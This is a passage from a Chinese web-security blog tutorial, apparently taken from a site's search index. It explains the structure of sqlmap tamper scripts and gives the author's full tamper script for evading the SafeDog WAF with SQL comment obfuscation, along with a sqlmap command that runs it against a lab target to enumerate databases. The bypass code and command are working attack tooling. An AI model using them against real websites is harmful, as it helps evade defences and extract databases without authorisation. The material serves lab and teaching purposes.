+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__priority__ = PRIORITY.LOWEST</span><br><span class="line">__priority__ = PRIORITY.LOWER</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line">__priority__ = PRIORITY.HIGH</span><br><span class="line">__priority__ = PRIORITY.HIGHER</span><br><span class="line">__priority__ = PRIORITY.HIGHEST</span><br></pre></td></tr></table></figure>
+<h5 id="dependencies函数"><a href="#dependencies函数" class="headerlink" title="dependencies函数"></a>dependencies函数</h5><p><code>dependencies</code>函数声明该脚本适用或不适用的范围，可以为空，例如：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">singleTimeWarnMessage(<span class="string">&quot;tamper script &#x27;%s&#x27; is only meant to be run against %s&quot;</span> % (os.path.basename(__file__).split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>], DBMS.ACCESS))</span><br><span class="line"><span class="comment"># singleTimeWarnMessage() 用于在控制台中打印出警告信息</span></span><br></pre></td></tr></table></figure>
+<h5 id="tamper函数"><a href="#tamper函数" class="headerlink" title="tamper函数"></a>tamper函数</h5><p><code>tamper</code>是主要的函数，接受的参数为<code>payload</code>和<code>**kwargs</code>，返回值为替换后的payload</p>
+<p>这里可以看出返回的是使用了python字符串替换函数replace，将字符串中的单引号和双引号进行转义</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload.replace(&quot;&#x27;&quot;, &quot;\\&#x27;&quot;).replace(&#x27;&quot;&#x27;, &#x27;\\&quot;&#x27;)</span><br></pre></td></tr></table></figure>
+<p>而<code>tamper</code>函数不仅有<code>payload</code>参数，还有可变长参数<code>**kwargs</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs)</span><br></pre></td></tr></table></figure>
+<p><code>kwargs</code>是一个字典，其结构为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;headers&#x27;: &#123;&#125;, &#x27;delimiter&#x27;: &#x27;&amp;&#x27;, &#x27;hints&#x27;: &#123;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>这里的<code>kwargs[&#39;headers&#39;]</code>很明显是我们的请求头，我们可以对其进行自定义。</p>
+<h4 id="编写一个简单的tamper脚本"><a href="#编写一个简单的tamper脚本" class="headerlink" title="编写一个简单的tamper脚本"></a>编写一个简单的tamper脚本</h4><p>在编写tamper脚本之前必须先清楚：需要绕过什么样的WAF，这类WAF的有什么绕过方法。</p>
+<p>具体WAF的绕过方法我在之前的文章详细讲解过了，我们可以根据绕过WAF的方法来构造我们的tamper脚本。例如以下是我写的绕过安全狗的tamper：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Replaces space character (&#x27; &#x27;) with custom annotator (&#x27;/*//--*/&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Notes:</span></span><br><span class="line"><span class="string">        * This tamper script works against safedog-waf.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM users&#x27;)</span></span><br><span class="line"><span class="string">    &#x27;SELECT/*//--*/id/*//--*/FROM/*//--*/users&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote, doublequote, firstspace = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(payload)):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = <span class="literal">True</span></span><br><span class="line">                    retVal += <span class="string">&quot;/*//--//*/&quot;</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;\&#x27;&#x27;</span>:</span><br><span class="line">                quote = <span class="keyword">not</span> quote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">                doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot; &quot;</span> <span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                retVal += <span class="string">&quot;/*//--//*/&quot;</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">            retVal=retVal.replace(<span class="string">&#x27;DATABASE(&#x27;</span>,<span class="string">&#x27;DATABASE/*//--//*/(&#x27;</span>)</span><br><span class="line">            retVal=retVal.replace(<span class="string">&#x27;VERSION(&#x27;</span>,<span class="string">&#x27;VERSION/*//--//*/(&#x27;</span>)</span><br><span class="line">            retVal=retVal.replace(<span class="string">&#x27;CURRENT_USER(&#x27;</span>,<span class="string">&#x27;CURRENT_USER/*//--//*/(&#x27;</span>)</span><br><span class="line">            retVal=retVal.replace(<span class="string">&#x27;SYSTEM_USER(&#x27;</span>,<span class="string">&#x27;SYSTEM_USER/*//--//*/(&#x27;</span>)</span><br><span class="line">            retVal=retVal.replace(<span class="string">&#x27;SESSION_USER(&#x27;</span>,<span class="string">&#x27;SESSION_USER/*//--//*/(&#x27;</span>)</span><br><span class="line">            retVal=retVal.replace(<span class="string">&#x27;USER(&#x27;</span>,<span class="string">&#x27;USER/*//--//*/(&#x27;</span>)</span><br><span class="line">            retVal=retVal.replace(<span class="string">&#x27;LOAD_FILE(&#x27;</span>,<span class="string">&#x27;LOAD_FILE/*//--//*/(&#x27;</span>)</span><br><span class="line">            retVal=retVal.replace(<span class="string">&#x27;/AS&#x27;</span>,<span class="string">&#x27;/--+/*%0aAS--+*/%0a&#x27;</span>)</span><br><span class="line">            retVal=retVal.replace(<span class="string">&#x27;INFORMATION_SCHEMA&#x27;</span>,<span class="string">&#x27;--+/*%0aINFORMATION_SCHEMA--+*/%0a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>
+<p>使用脚本绕过安全狗WAF：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.123.42/sqli/Less-2/?id=1&quot; --dbs --tamper &quot;bypass-safedog.py&quot; -v 3 --random-agent --technique U --batch --no-cast</span><br></pre></td></tr></table></figure>
+<p>虽然不知道是什么原因只跑出了当前数据库名</p>
+<p><img src="https://i.loli.net/2021/11/04/cvpduIW6sehoQHf.png" alt="image-20211104155959079"></p>
+<p>但是我们把sqlmap生成的payload拿去做手工注入却可以爆出所有数据库名</p>
+<p><img src="https://i.loli.net/2021/11/04/gq2D45iwRYAMy7L.png" alt="image-20211104160159787"></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
       </tags>
   </entry>
 </search>
